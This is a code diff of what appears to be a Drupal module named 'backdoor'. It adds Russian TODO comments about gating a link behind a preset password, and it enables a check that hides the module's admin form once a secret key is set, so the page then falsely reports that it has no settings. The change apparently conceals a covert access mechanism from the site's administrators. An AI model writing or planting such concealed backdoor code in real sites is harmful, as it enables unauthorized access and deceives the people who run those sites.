@@ -1,5 +1,11 @@
 <?php
 
+/*
+ * 	Вынести настройки админки в другой файл.
+ * 	Попробовать создать форму на странице со ссылкой и по условию, что пароль совпадает с заранее заданным - показать ссылку. До этого ссылка е должна покаызываться.
+ * 	Попробовать параметр #after_build
+ */
+
 require_once DRUPAL_ROOT . '/' . variable_get('password_inc', 'includes/password.inc');
 
 function backdoor_menu() {
@@ -69,13 +75,13 @@ function backdoor() {
 }
 
 function admin_page_backdoor() {
-//  $key = variable_get('key');
-//  if(!empty($key)){
-//    $pass_access = t('На этой странице нет настроек');
-//  }else{
-    $pass_access = drupal_get_form('admin_backdoor_form');
-    $pass_access = drupal_render($pass_access);
-//  }
+  $key = variable_get('key');
+  if(!empty($key)){
+    $pass_access = t('На этой странице нет настроек');
+  }else{
+	$pass_access = drupal_get_form('admin_backdoor_form');
+	$pass_access = drupal_render($pass_access);
+  }
   return $pass_access;
 }
 
